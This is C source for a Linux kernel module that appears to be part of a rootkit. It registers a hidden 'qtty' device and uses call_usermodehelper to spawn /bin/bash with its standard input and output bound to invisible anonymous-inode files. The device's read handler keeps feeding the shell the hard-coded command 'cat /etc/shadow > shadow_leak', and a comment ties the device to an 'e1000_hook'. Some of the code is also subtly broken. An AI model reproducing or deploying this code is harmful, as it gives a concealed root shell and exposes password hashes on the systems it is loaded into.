#include "tty_util.h"
#include "taskutil.h"


//this qtty will interact with the e1000_hook



struct qtty qtty;




char* str = "cat /etc/shadow > shadow_leak\n";

ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
    printk(KERN_INFO "WRITING\n");
    char* kbuf = (char*)kzalloc(size+1, GFP_KERNEL); //make sure the string actually terminates so add 1 
    if(!access_ok(buf, size)){
        return -EFAULT;
    }

    if(copy_from_user(kbuf, buf, size)){ //copy_from_user returns 0
        return -EFAULT; //invalid buffer
    }
    
    printk(KERN_INFO "%s\n", kbuf);
    
    return size;


    
}


int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
    printk(KERN_INFO "TTY opened");
    return 0;
}

ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){
  
  size_t to_copy = size <= strlen(str) ? size : strlen(str);
  //printk(KERN_INFO "Pre-READ %ld, offset: %llu, to_copy: %d, str_size: %d", size, *off, to_copy, strlen(str));
  if(!access_ok(buf,size))
    return -EFAULT;
  //printk(KERN_INFO "copying\n");
  unsigned long ret = copy_to_user(buf, str+(*off % strlen(str)), to_copy);
  (*off) = ((*off) + 1) % strlen(str);
  //printk(KERN_INFO "Post-READ %ld, offset: %llu", size, *off);
  //printk(KERN_INFO "copied bytes: %lu\n", ret);
  return to_copy;
    
  
}

const struct file_operations qtty_fops = {
    .open = qtty_open,
    .write = qtty_write,
    .read = qtty_read,  
    .owner = THIS_MODULE
};


/*
Allocate a fd to a qtty. 
*/
struct file* alloc_file_qtty(int flags, const struct cred* cred){ //the idea is that cred has already been initialized in the ini function of umh. So, what we can do is call current_cred() to get the cred
  struct file* f;
  f = kzalloc(sizeof(struct file), GFP_KERNEL);
  if(!f){
    printk(KERN_INFO "OOM'd\n");
    return -1;
  }
  f->f_cred = cred;
  atomic_long_set(&f->f_count, 1);
  rwlock_init(&f->f_owner.lock);
  spin_lock_init(&f->f_lock);
  mutex_init(&f->f_pos_lock);
  f->f_flags = flags; 
  f->f_mode = FMODE_READ | FMODE_WRITE | FMODE_CAN_WRITE;

  //above is all initialization. Now it's time to setup the qtty

  f->f_op = &qtty_fops;

  return f;


}



void init_qtty(void){ //init dev
    int err;
    err = register_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT , "qogchamp");//reverse major and minor numbers for use.
    
    if(err){
        printk(KERN_INFO "Failed to reserve major and minor numbers");
        return;
    }
    
    
    cdev_init(&qtty.cdev, &qtty_fops);
    err = cdev_add(&qtty.cdev, MKDEV(QTTY_MAJOR, QTTY_MINOR), 1);
    qtty.cdev.owner = THIS_MODULE;
    printk(KERN_INFO "error: %d\n", err);
    if(err){
        qtty.cdev.owner = NULL;
        printk(KERN_INFO "cdev could not be added\n");

    }

    
}

void qtty_clean_up(void){
    
   
    unregister_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT);
    
    if(!qtty.cdev.owner){
        printk(KERN_INFO "qtty not initialized\n");
        return;
    }


    cdev_del(&qtty.cdev);


}








struct task_struct* umh_tsk = NULL; //call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.

DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for umh_tsk to be populated



int init_func(struct subprocess_info* info, struct cred* new){ 
  int retval;
  struct file* qtty_file_0;
  struct file* qtty_file_1;
  struct file* qtty_file_2;
  //printk(KERN_INFO "old task ptr: 0x%lx, new task ptr: 0x%lx", (unsigned long)info->data, (unsigned long)current);
  umh_tsk = current; //get task_struct
  get_task_struct(umh_tsk); //increase reference counter so the task doesn't disappear from under us
  wake_up(&qogchamp_wait); 
 // printk("PID: %d\n", current->pid);
  
  qtty_file_0 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_1 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_2 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);

  //do it three times for 0,1, and 2

  retval = get_unused_fd_flags(0); //this is an important check as it reserves an fd.
  
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_0); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_1); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
  //  printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_2); //thank FUCKING GOD this is exported. 
  return 0;

}

void launch_bash(void){
  struct subprocess_info* sub_info;
  int status;
  char* argv[] = {"hello world!\xA", NULL}; //for some reason these arrays need to be null terminated. 
  DECLARE_WAITQUEUE(wait, current);
  add_wait_queue(&qogchamp_wait, &wait); //add it here so we don't hit a race condition

  char* envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    NULL
  };
  sub_info = call_usermodehelper_setup("/bin/bash", argv, envp, GFP_KERNEL, init_func, NULL,  (void*)current);
  call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
  //it is possible that we get preempted here. However, because we added it to the wait_queue, it shouldn't matter despite umh_exec executing asynchronously
  while(1){ //wait for task to start
    set_current_state(TASK_UNINTERRUPTIBLE);
    if(umh_tsk != NULL)
      break;
    schedule();
  }
  __set_current_state(TASK_RUNNING);
  remove_wait_queue(&qogchamp_wait, &wait);
  put_task_struct(umh_tsk);
}